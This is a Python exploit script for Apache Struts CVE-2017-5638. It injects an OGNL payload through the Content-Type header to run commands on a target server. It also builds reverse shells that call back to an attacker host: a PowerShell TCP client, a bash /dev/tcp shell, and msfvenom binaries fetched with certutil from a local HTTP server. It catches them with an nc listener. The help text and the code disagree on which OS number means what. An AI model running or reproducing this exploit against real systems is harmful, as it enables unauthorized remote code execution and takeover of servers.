# Author (m4ud)
# Apache Struts-045
# CVE : 2017-5638
from base64 import b64encode
import sys
import requests
from optparse import OptionParser
import os
import subprocess
import http.server
import threading
import time


def serverShutdown(server):
	server.stop()
	print("Shutting Server down!")


class AS045:
	def __init__(self, options):
		self.target = options.target
		self.directory = options.directory
		self.command = options.command
		self.rport = options.rport
		self.osys = options.osys
		self.lport = options.lport
		self.lhost = options.lhost
		self.wport = options.wport
		self.shell = options.shell

		if(len(sys.argv) < 3):
			print('\n python3 exploit.py -h   ...for help')
			print('\n Usage : exploit.py RHOST RPORT Struts-directory cmd')

		else:
			def pwrsh():
				print("\r\n[+] (m4ud) AS-045 RCE [+]")
				print("\r\n[*] Deploying PowerShell [*]\r\n")
				payload = "$client = New-Object System.Net.Sockets.TCPClient('" + self.lhost + "'," + str(self.lport) + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS(m4ud) ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
				payload = b64encode(payload.encode('UTF-16LE')).decode()
				return payload


			def bsh():
				payload = "bash -i >&/dev/tcp/%s/%s 0>&1" % (self.lhost, str(self.lport))
				return payload

			def venom(shell, ext):
				os.system("msfvenom -p "+ shell + "/shell_reverse_tcp LHOST=" + self.lhost+ " LPORT="+ str(self.lport) + " -f "+ ext+ " > shelb")


#			if self.wport is not None:
			def srv():
				print("\r\n[+] (m4ud) AS-045 RCE [+]\r\n")
				print("[+] Serving Payload at port " + str(self.wport) +" [+]\r\n")
				server_address = (self.lhost, int(self.wport))
				self.httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
				self.server_thread = threading.Thread(target=self.httpd.serve_forever).start()

			def stop(self):
				time.sleep(4)
				print("\r\n[+] Shutting Server down! [+]\r\n")
				self.httpd.shutdown()
				self.httpd.server_close()

#			proxies='http://127.0.0.1:8080'
#			proxies = {'http' : proxies}
			target = 'http://' + self.target #Vulnerable Server
			port = self.rport
			directory = self.directory # Struts Application directory
			cmd = self.command

			if self.osys == "1":
				shell = "windows"
				ext = "exe"

				if self.shell == "1":
					cmd = pwrsh()
				elif self.shell == "2":
					venom(shell, ext)
					srv()
					os.system('mv shelb shelb.exe')
					cmd = "certutil -urlcache -f -split http://%s:%s/shelb.exe;.\shelb.exe" % (self.lhost, self.wport)
					cmd = b64encode(cmd.encode('UTF-16LE')).decode()

			if self.osys == "2":
				shell = "linux"
				ext = "elf"
				venom(shell, ext)
				cmd = "curl http://%s/shelb |bash"
				cmd = bsh()

			URL = target + ':' + str(self.rport) + '/' + directory + '/'

			payload = "%{(#_='multipart/form-data')."
			payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
			payload += "(#_memberAccess?"
			payload += "(#_memberAccess=#dm):"
			payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
			payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
			payload += "(#ognlUtil.getExcludedPackageNames().clear())."
			payload += "(#ognlUtil.getExcludedClasses().clear())."
			payload += "(#context.setMemberAccess(#dm))))."
			payload += "(#cmd='%s')." % cmd
			payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
			payload += "(#cmds=(#iswin?{'powershell.exe','-nop','-e',#cmd}:{'/bin/bash','-c',#cmd}))."
			payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
			payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
			payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
			payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
			payload += "(#ros.flush())}"

			headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}

			f = subprocess.Popen(["nc", "-lvnp", str(self.lport)])
			r = requests.get(URL, headers=headers)
			stop(self)
			f.communicate()


def main():
	parser = OptionParser()
	parser.add_option("-p", "--port", dest="rport", default=8080, help="RPORT, ")
	parser.add_option("-t", "--target", dest="target", help="Vulnerable Target, ")
	parser.add_option("-d", "--dir", dest="directory",default='struts2-rest-showcase', help="Struts Application directory, ")
	parser.add_option("-c", "--command", dest="command", help="System Command, ")
	parser.add_option("-o", "--os", dest="osys", help="Choose OS: Linux = 1, Windows = 2")
	parser.add_option("-l", "--lhost", dest="lhost", help="LHOST")
	parser.add_option("-P", "--lport", dest="lport",default=443 ,help="LPORT")
	parser.add_option("-w", "--wport", dest="wport", default=4443, help="WPORT")
	parser.add_option("-s", "--shell", dest="shell", help="Shell type: 1 = powershell or bash, and 2 = msfvenom")
	(options, args) = parser.parse_args() 
	exploit = AS045(options) 

if __name__=="__main__": 
	main()

